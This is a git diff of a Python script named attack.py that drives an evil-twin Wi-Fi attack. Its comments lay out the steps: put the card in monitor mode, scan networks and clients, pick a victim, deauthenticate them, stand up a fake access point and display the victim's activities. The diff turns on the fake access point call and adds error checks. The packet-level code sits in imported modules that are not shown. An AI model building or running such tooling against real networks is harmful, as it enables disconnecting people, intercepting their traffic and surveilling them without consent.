@@ -2,18 +2,21 @@
 
 # sudo python3 attack.py
 
-# detect the WLAN
+# detect
 """
 1. turn on monitor mode
 2. scan
 3. display all the WI-FI
 4. let the user choose one WI-FI
 5. display choosen WI-FI users
+6. let the user choose one victim
 """
 # attack
 """
-1. let the user choose wich one he wants to attack
-2. Disconnect the victim from WI-FI (using deauthentication)
+1. Disconnect the victim from WI-FI (using deauthentication)
+2. Disconnect the WI-FI from victim (using deauthentication)
+...
+*. create fake WI-FI.
 ...
 *. display victim's activities 
 """
@@ -22,9 +25,8 @@
 1. turn off monitor mode
 """
 
-from scapy.all import *
-from network import Network
 from fake import Fake
+from network import Network
 
 
 def start_attack():
@@ -33,17 +35,23 @@ def start_attack():
     #     sys.exit('need sudo permission')
 
     net_obj = Network()
-    net_interface = net_obj.get_interface()
+    interface = net_obj.get_interface()
+    if interface == 'None':
+        return -1
     # scanning for networks
     net_mac = net_obj.scanning_networks()
+    if net_mac == 'None':
+        return -1
     # scanning for clients 
     cli_mac = net_obj.scanning_clients()
+    if cli_mac == 'None':
+        return -1
 
-    fake_obj = Fake(net_interface, net_mac, cli_mac)
+    fake_obj = Fake(interface, net_mac, cli_mac)
     # deauthentication
-    fake_obj.deauthentication()
+    fake_obj.deauthentication_packet()
     # fake_ap
-    # net_obj.fake_ap()
+    fake_obj.fake_ap()
 
     net_obj.off()
     print('done')
